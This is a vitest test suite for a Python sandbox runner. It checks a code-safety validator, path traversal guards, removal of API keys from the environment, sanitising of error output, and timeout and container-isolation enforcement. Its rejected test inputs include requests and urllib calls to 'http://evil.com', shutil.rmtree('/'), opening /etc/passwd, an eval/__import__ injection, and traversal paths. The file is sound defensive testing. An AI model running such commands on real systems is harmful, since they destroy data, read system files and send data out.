import { describe, it, expect } from 'vitest';
import {
  validatePythonCodeSafety,
  validateDatasetPath,
  createScrubbedEnvironment,
  sanitizeErrorOutput,
  executeSandboxedPython,
} from '../../src/lib/python/sandbox-runner.js';
import { PythonAnalysisRequest } from '../../src/lib/python/types.js';

describe('Python Sandbox Security & Isolation Boundaries (M8)', { timeout: 25000 }, () => {
  describe('AST / Static Code Safety Validator', () => {
    it('blocks dangerous OS and subprocess calls', () => {
      expect(validatePythonCodeSafety('import os\nos.system("whoami")').safe).toBe(false);
      expect(validatePythonCodeSafety('import subprocess\nsubprocess.run(["cmd"])').safe).toBe(false);
      expect(validatePythonCodeSafety('import shutil\nshutil.rmtree("/")').safe).toBe(false);
      expect(validatePythonCodeSafety('import ctypes\nctypes.CDLL("kernel32")').safe).toBe(false);
    });

    it('blocks network exfiltration attempts', () => {
      expect(validatePythonCodeSafety('import socket\ns = socket.socket()').safe).toBe(false);
      expect(validatePythonCodeSafety('import urllib.request\nurllib.request.urlopen("http://evil.com")').safe).toBe(false);
      expect(validatePythonCodeSafety('import requests\nrequests.post("http://evil.com")').safe).toBe(false);
      expect(validatePythonCodeSafety('import http.client').safe).toBe(false);
    });

    it('blocks dynamic evaluation and arbitrary file I/O outside dataset', () => {
      expect(validatePythonCodeSafety('eval("__import__(\'os\').system(\'ls\')")').safe).toBe(false);
      expect(validatePythonCodeSafety('exec("x = 1")').safe).toBe(false);
      expect(validatePythonCodeSafety('f = open("/etc/passwd", "r")').safe).toBe(false);
      expect(validatePythonCodeSafety('__import__("os")').safe).toBe(false);
    });

    it('permits safe statistical code using allowed libraries', () => {
      const safeCode = `
import math
import statistics

values = [r.get('x') for r in data if r.get('x') is not None]
result = {
  'interpretation': 'Computed mean using safe standard library math',
  'numericResults': {
    'mean': statistics.mean(values) if values else 0.0
  }
}
`;
      const check = validatePythonCodeSafety(safeCode);
      expect(check.safe).toBe(true);
    });
  });

  describe('Dataset Authorization & Path Traversal Guard', () => {
    it('permits valid dataset paths within authorized workspace roots', () => {
      const validPath = 'datasets/sample_sales.csv';
      const resolved = validateDatasetPath(validPath);
      expect(resolved).toContain('sample_sales.csv');
    });

    it('rejects path traversal escaping authorized dataset roots', () => {
      expect(() => validateDatasetPath('../../../Windows/System32/drivers/etc/hosts')).toThrow(/access denied/i);
      expect(() => validateDatasetPath('../../package.json')).toThrow(/access denied/i);
    });

    it('rejects non-existent dataset paths even if under authorized roots', () => {
      expect(() => validateDatasetPath('datasets/non_existent_file_xyz.csv')).toThrow(/does not exist/i);
    });
  });

  describe('Environment Variable Scrubbing', () => {
    it('strictly omits API keys and application secrets from the worker environment', () => {
      // Mock sensitive credentials in process.env
      const origKey = process.env.OPENAI_API_KEY;
      const origAnthropic = process.env.ANTHROPIC_API_KEY;
      const origDb = process.env.DATABASE_URL;

      try {
        process.env.OPENAI_API_KEY = 'sk-mock-secret-key-12345';
        process.env.ANTHROPIC_API_KEY = 'anthropic-secret-xyz';
        process.env.DATABASE_URL = 'postgres://user:password@localhost:5432/db';

        const scrubbed = createScrubbedEnvironment();

        expect(scrubbed.OPENAI_API_KEY).toBeUndefined();
        expect(scrubbed.ANTHROPIC_API_KEY).toBeUndefined();
        expect(scrubbed.DATABASE_URL).toBeUndefined();
        expect(scrubbed.PYTHONIOENCODING).toBe('utf-8');
      } finally {
        process.env.OPENAI_API_KEY = origKey;
        process.env.ANTHROPIC_API_KEY = origAnthropic;
        process.env.DATABASE_URL = origDb;
      }
    });
  });

  describe('Error Output Sanitization', () => {
    it('redacts workspace directory paths from error messages', () => {
      const hostPath = process.cwd();
      const rawError = `FileNotFoundError: No such file or directory: '${hostPath}\\secret\\data.csv'`;
      const sanitized = sanitizeErrorOutput(rawError);
      expect(sanitized).not.toContain(hostPath);
      expect(sanitized).toContain('<workspace>');
    });
  });

  describe('Execution Limits & Timeout Enforcement', () => {
    it('enforces timeout termination and reports timeout status', async () => {
      // Custom script that hangs with a loop longer than timeout
      const hangReq: PythonAnalysisRequest = {
        taskId: 'timeout-test',
        taskType: 'custom_script',
        datasetId: 'sample_sales',
        datasetPath: 'datasets/sample_sales.csv',
        columns: ['unit_price'],
        code: `
import math
# Compute CPU-intensive loop to trigger timeout
total = 0
for i in range(1000000000):
    total += math.sqrt(i)
result = {'total': total}
`,
        limits: {
          timeoutMs: 800, // 800ms limit
          maxOutputBytes: 524288,
          maxRows: 100,
        },
      };

      const result = await executeSandboxedPython(hangReq);
      expect(result.status).toBe('timeout');
      expect(result.error).toMatch(/timed out/i);
      expect(result.warnings.some((w) => w.includes('threshold') || w.includes('limit'))).toBe(true);
    }, 10000);

    it('rejects custom script attempting forbidden imports at execution boundary', async () => {
      const maliciousReq: PythonAnalysisRequest = {
        taskId: 'sec-reject-test',
        taskType: 'custom_script',
        datasetId: 'sample_sales',
        datasetPath: 'datasets/sample_sales.csv',
        columns: ['unit_price'],
        code: 'import os\nos.system("calc")',
      };

      const result = await executeSandboxedPython(maliciousReq);
      expect(result.status).toBe('error');
      expect(result.error).toMatch(/Disallowed operation or module detected/i);
    });

    it('rejects untrusted custom scripts when strict container isolation is required but unavailable', async () => {
      const origMode = process.env.PYTHON_SANDBOX_MODE;
      const origContainer = process.env.CONTAINER_SANDBOX_ACTIVE;

      try {
        process.env.PYTHON_SANDBOX_MODE = 'strict_container_only';
        delete process.env.CONTAINER_SANDBOX_ACTIVE;

        const untrustedReq: PythonAnalysisRequest = {
          taskId: 'untrusted-script-reject',
          taskType: 'custom_script',
          datasetId: 'sample_sales',
          datasetPath: 'datasets/sample_sales.csv',
          columns: ['unit_price'],
          code: 'result = {"mean": 123.45}',
        };

        const result = await executeSandboxedPython(untrustedReq);
        expect(result.status).toBe('error');
        expect(result.interpretation).toContain('production container isolation is required');
        expect(result.error).toMatch(/Arbitrary Python code requires a verified hardened container sandbox/i);
        expect(result.warnings.some((w) => w.includes('Workstation restricted subprocess is not authorized'))).toBe(true);
      } finally {
        process.env.PYTHON_SANDBOX_MODE = origMode;
        if (origContainer !== undefined) {
          process.env.CONTAINER_SANDBOX_ACTIVE = origContainer;
        } else {
          delete process.env.CONTAINER_SANDBOX_ACTIVE;
        }
      }
    });

    it('accurately reports isolation level and workerSandboxType in provenance', async () => {
      const req: PythonAnalysisRequest = {
        taskId: 'prov-test',
        taskType: 'descriptive_stats',
        datasetId: 'sample_sales',
        datasetPath: 'datasets/sample_sales.csv',
        columns: ['unit_price'],
        parameters: { column: 'unit_price' },
      };

      const result = await executeSandboxedPython(req);
      expect(result.status).toBe('success');
      expect(result.provenance.workerSandboxType).toBe('restricted_subprocess_dev');
      expect(result.provenance.isolationLevel).toBe('development_restricted_subprocess');
    });
  });
});
